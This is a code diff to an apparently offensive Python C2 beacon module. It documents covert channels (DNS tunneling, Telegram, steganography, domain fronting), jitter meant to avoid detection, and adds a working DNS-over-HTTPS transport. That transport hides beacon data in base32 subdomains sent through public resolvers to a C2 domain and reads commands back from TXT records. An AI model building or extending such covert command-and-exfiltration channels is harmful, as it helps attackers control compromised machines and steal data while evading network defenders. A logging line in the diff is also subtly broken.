@@ -12,15 +12,18 @@ This module provides:
 
 import base64
 import hashlib
+import io
 import json
 import logging
 import os
 import secrets
 import ssl
+import struct
 import threading
 import time
 import urllib.parse
 import urllib.request
+import zlib
 from collections.abc import Callable
 from dataclasses import dataclass, field
 from enum import Enum
@@ -48,13 +51,29 @@ logger = logging.getLogger(__name__)
 # CONSTANTS & CONFIG
 # =============================================================================
 
-DEFAULT_SLEEP_INTERVAL = 60
-DEFAULT_JITTER_MIN = 10
-DEFAULT_JITTER_MAX = 30
+# Import centralized config
+try:
+    from core.config import C2_CONFIG
+    DEFAULT_SLEEP_INTERVAL = C2_CONFIG.DEFAULT_SLEEP_INTERVAL
+    DEFAULT_JITTER_MIN = C2_CONFIG.JITTER_MIN
+    DEFAULT_JITTER_MAX = C2_CONFIG.JITTER_MAX
+except ImportError:
+    # Fallback if config not available
+    DEFAULT_SLEEP_INTERVAL = 60
+    DEFAULT_JITTER_MIN = 10
+    DEFAULT_JITTER_MAX = 30
 
 
 class C2Protocol(Enum):
-    """Auto-generated docstring for C2Protocol class."""
+    """Command & Control communication protocol types.
+
+    Supported protocols:
+    - HTTPS: Encrypted web traffic (most common)
+    - HTTP: Unencrypted web traffic (fallback)
+    - DNS: DNS tunneling for covert communication
+    - TELEGRAM: Telegram bot API as C2 channel
+    - STEGO: Steganographic image-based communication
+    """
 
     HTTPS = "https"
     HTTP = "http"
@@ -64,7 +83,14 @@ class C2Protocol(Enum):
 
 
 class BeaconStatus(Enum):
-    """Auto-generated docstring for BeaconStatus class."""
+    """Current status of a beacon agent.
+
+    States:
+    - DORMANT: Beacon is sleeping between check-ins
+    - CHECKING_IN: Beacon is communicating with C2 server
+    - ACTIVE: Beacon is executing a task
+    - ERROR: Beacon encountered a communication error
+    """
 
     DORMANT = "dormant"
     CHECKING_IN = "checking_in"
@@ -74,7 +100,18 @@ class BeaconStatus(Enum):
 
 @dataclass
 class C2Config:
-    """Auto-generated docstring for C2Config class."""
+    """Configuration for C2 beacon operations.
+
+    Attributes:
+        protocol: Communication protocol (HTTPS, DNS, etc.)
+        primary_host: Main C2 server hostname
+        primary_port: C2 server port
+        sleep_interval: Base sleep time between check-ins (seconds)
+        jitter_min/max: Randomization range for sleep time
+        fronting_domain: Domain fronting target (CDN)
+        actual_host: Real C2 server behind fronting
+        encryption_key: AES key for payload encryption
+    """
 
     protocol: C2Protocol = C2Protocol.HTTPS
     primary_host: str = "localhost"
@@ -94,7 +131,14 @@ class C2Config:
 
 @dataclass
 class BeaconMessage:
-    """Auto-generated docstring for BeaconMessage class."""
+    """Message sent from C2 server to beacon agent.
+
+    Attributes:
+        message_id: Unique identifier for tracking responses
+        command: Command to execute (shell, download, etc.)
+        data: Optional command parameters
+        timestamp: Message creation time (epoch)
+    """
 
     message_id: str
     command: str
@@ -104,7 +148,14 @@ class BeaconMessage:
 
 @dataclass
 class BeaconResponse:
-    """Auto-generated docstring for BeaconResponse class."""
+    """Response sent from beacon agent to C2 server.
+
+    Attributes:
+        success: Whether command executed successfully
+        message_id: ID of the original message being responded to
+        command: Echo of executed command for verification
+        data: Command output or error details
+    """
 
     success: bool
     message_id: str
@@ -113,7 +164,12 @@ class BeaconResponse:
 
 
 class JitterEngine:
-    """Auto-generated docstring for JitterEngine class."""
+    """Randomization engine for beacon sleep intervals.
+
+    Implements random jitter to avoid detection through
+    predictable beacon timing patterns. Adds randomness
+    within configured min/max bounds to base sleep interval.
+    """
 
     def __init__(
         self,
@@ -242,7 +298,8 @@ class StegoTransport:
 
             new_chunk = chunk_len + chunk_type + data + crc
             return png_bytes[:-12] + new_chunk + png_bytes[-12:]
-        except Exception:
+        except (ValueError, struct.error) as e:
+            logger.debug("Stego encoding failed: %s", e)
             return data
 
     @staticmethod
@@ -595,7 +652,7 @@ class DNSTunneler:
                 resolver.timeout = 5
                 resolver.lifetime = 5
 
-                logger.debug("DNS Resolved query: {query_name} (type: %s)", record_type)
+                logger.debug(f"DNS Resolved query: {query_name} (type: %s)", record_type)
 
                 # In a real C2, you'd specify your own authoritative nameserver
                 # Here we use system defaults or common ones for the demo
@@ -639,6 +696,293 @@ class DNSTunneler:
         for i in range(0, len(data), chunk_size):
             chunks.append(data[i : i + chunk_size])
         return chunks
+
+
+# =============================================================================
+# DNS OVER HTTPS (DoH) C2 TRANSPORT
+# =============================================================================
+
+
+class DoHTransport:
+    """DNS over HTTPS transport for stealthier C2 communication.
+
+    DoH encapsulates DNS queries in HTTPS, making traffic appear as normal
+    web browsing and bypassing traditional DNS inspection/filtering.
+
+    Supported providers:
+    - Cloudflare: 1.1.1.1
+    - Google: 8.8.8.8
+    - Quad9: 9.9.9.9
+
+    Wire format: RFC 8484 (DNS Wireformat over HTTPS)
+    """
+
+    # DoH provider endpoints
+    DOH_PROVIDERS: dict[str, str] = {
+        "cloudflare": "https://cloudflare-dns.com/dns-query",
+        "google": "https://dns.google/dns-query",
+        "quad9": "https://dns.quad9.net:5053/dns-query",
+        "custom": "",  # For custom DoH server
+    }
+
+    def __init__(
+        self,
+        c2_domain: str,
+        provider: str = "cloudflare",
+        custom_endpoint: str | None = None,
+        timeout: int = 10,
+    ) -> None:
+        """Initialize DoH transport.
+
+        Args:
+            c2_domain: C2 domain for DNS queries
+            provider: DoH provider (cloudflare, google, quad9, custom)
+            custom_endpoint: Custom DoH endpoint URL if provider is 'custom'
+            timeout: Request timeout in seconds
+
+        """
+        self.c2_domain = c2_domain
+        self.timeout = timeout
+
+        if provider == "custom" and custom_endpoint:
+            self.endpoint = custom_endpoint
+        elif provider in self.DOH_PROVIDERS:
+            self.endpoint = self.DOH_PROVIDERS[provider]
+        else:
+            self.endpoint = self.DOH_PROVIDERS["cloudflare"]
+
+        self.provider = provider
+        logger.info(
+            "DoH transport initialized: %s via %s", c2_domain, self.endpoint
+        )
+
+    def _build_dns_query(self, name: str, qtype: int = 16) -> bytes:
+        """Build DNS wire format query.
+
+        Args:
+            name: Domain name to query
+            qtype: DNS record type (16=TXT, 1=A, 28=AAAA)
+
+        Returns:
+            DNS wire format query bytes
+
+        """
+        # Transaction ID (random)
+        import random
+        import struct
+        txn_id = random.randint(0, 65535)
+
+        # Flags: Standard query
+        flags = 0x0100  # RD (Recursion Desired)
+
+        # Counts
+        qdcount = 1  # 1 question
+        ancount = 0
+        nscount = 0
+        arcount = 0
+
+        # Header
+        header = struct.pack(
+            ">HHHHHH", txn_id, flags, qdcount, ancount, nscount, arcount
+        )
+
+        # Question section
+        question = b""
+        for label in name.split("."):
+            question += bytes([len(label)]) + label.encode("ascii")
+        question += b"\x00"  # Null terminator
+
+        # QTYPE and QCLASS
+        question += struct.pack(">HH", qtype, 1)  # IN class
+
+        return header + question
+
+    def _skip_dns_name(self, data: bytes, pos: int) -> int:
+        """Skip over a DNS name in wire format, handling compression pointers.
+
+        Args:
+            data: Raw DNS data bytes
+            pos: Current position in data
+
+        Returns:
+            New position after skipping the name
+        """
+        if pos >= len(data):
+            return pos
+
+        # Handle compression pointer (two high bits set)
+        if data[pos] & 0xC0 == 0xC0:
+            return pos + 2
+
+        # Skip label-by-label until null terminator
+        while pos < len(data) and data[pos] != 0:
+            label_len = data[pos]
+            if label_len & 0xC0 == 0xC0:  # Compression pointer encountered
+                return pos + 2
+            pos += 1 + label_len
+
+        return pos + 1  # Skip null terminator
+
+    def _parse_txt_record(self, txt_data: bytes) -> list[str]:
+        """Parse TXT record data (length-prefixed strings).
+
+        Args:
+            txt_data: Raw TXT record RDATA bytes
+
+        Returns:
+            List of decoded TXT strings
+        """
+        results = []
+        txt_pos = 0
+
+        while txt_pos < len(txt_data):
+            txt_len = txt_data[txt_pos]
+            txt_pos += 1
+
+            if txt_pos + txt_len <= len(txt_data):
+                text = txt_data[txt_pos : txt_pos + txt_len].decode(
+                    "utf-8", errors="ignore"
+                )
+                results.append(text)
+
+            txt_pos += txt_len
+
+        return results
+
+    def _parse_dns_response(self, data: bytes) -> list[str]:
+        """Parse DNS wire format response.
+
+        Args:
+            data: Raw DNS response bytes
+
+        Returns:
+            List of TXT record strings
+        """
+        import struct
+
+        if len(data) < 12:
+            return []
+
+        # Parse header to get answer count
+        ancount = struct.unpack(">H", data[6:8])[0]
+
+        # Skip header and question section
+        pos = 12
+        pos = self._skip_dns_name(data, pos)
+        pos += 4  # QTYPE + QCLASS
+
+        # Parse answer records
+        results = []
+        for _ in range(ancount):
+            if pos >= len(data):
+                break
+
+            pos = self._skip_dns_name(data, pos)
+
+            if pos + 10 > len(data):
+                break
+
+            # Parse TYPE, CLASS, TTL, RDLENGTH
+            rtype, _rclass, _ttl, rdlength = struct.unpack(
+                ">HHIH", data[pos : pos + 10]
+            )
+            pos += 10
+
+            if rtype == 16:  # TXT record
+                txt_data = data[pos : pos + rdlength]
+                results.extend(self._parse_txt_record(txt_data))
+
+            pos += rdlength
+
+        return results
+
+    def query(
+        self,
+        subdomain: str = "",
+        record_type: str = "TXT",
+    ) -> tuple[bool, list[str]]:
+        """Send DNS query over HTTPS.
+
+        Args:
+            subdomain: Subdomain to prepend to c2_domain
+            record_type: DNS record type (TXT, A, AAAA)
+
+        Returns:
+            Tuple of (success, list of response strings)
+
+        """
+        try:
+            # Build query name
+            if subdomain:
+                query_name = f"{subdomain}.{self.c2_domain}"
+            else:
+                query_name = self.c2_domain
+
+            # Map record type to QTYPE
+            qtype_map = {"A": 1, "AAAA": 28, "TXT": 16, "CNAME": 5, "MX": 15}
+            qtype = qtype_map.get(record_type.upper(), 16)
+
+            # Build wire format query
+            query_data = self._build_dns_query(query_name, qtype)
+
+            # Send via HTTPS POST (wire format)
+            headers = {
+                "Content-Type": "application/dns-message",
+                "Accept": "application/dns-message",
+            }
+
+            request = urllib.request.Request(
+                self.endpoint,
+                data=query_data,
+                headers=headers,
+                method="POST",
+            )
+
+            with urllib.request.urlopen(request, timeout=self.timeout) as resp:
+                response_data = resp.read()
+                results = self._parse_dns_response(response_data)
+                return True, results
+
+        except urllib.error.URLError as e:
+            logger.warning("DoH query failed: %s", e)
+            return False, []
+        except Exception as e:
+            logger.exception("DoH transport error: %s", e)
+            return False, []
+
+    def send_beacon(self, data: bytes) -> tuple[bool, bytes]:
+        """Send beacon data via DoH encoded in subdomain.
+
+        Args:
+            data: Data to send (will be base32 encoded)
+
+        Returns:
+            Tuple of (success, response_data)
+
+        """
+        # Encode data as base32 subdomain
+        encoded = base64.b32encode(data).decode("ascii").rstrip("=").lower()
+
+        # Split into valid DNS labels (max 63 chars each)
+        labels = []
+        for i in range(0, len(encoded), 50):
+            labels.append(encoded[i : i + 50])
+
+        subdomain = ".".join(labels)
+
+        success, responses = self.query(subdomain, "TXT")
+
+        if success and responses:
+            # Decode response (assuming base32)
+            try:
+                response_encoded = "".join(responses).upper()
+                padding = (8 - len(response_encoded) % 8) % 8
+                response_encoded += "=" * padding
+                return True, base64.b32decode(response_encoded)
+            except Exception:
+                return True, "\n".join(responses).encode()
+
+        return success, b""
 
 
 # =============================================================================
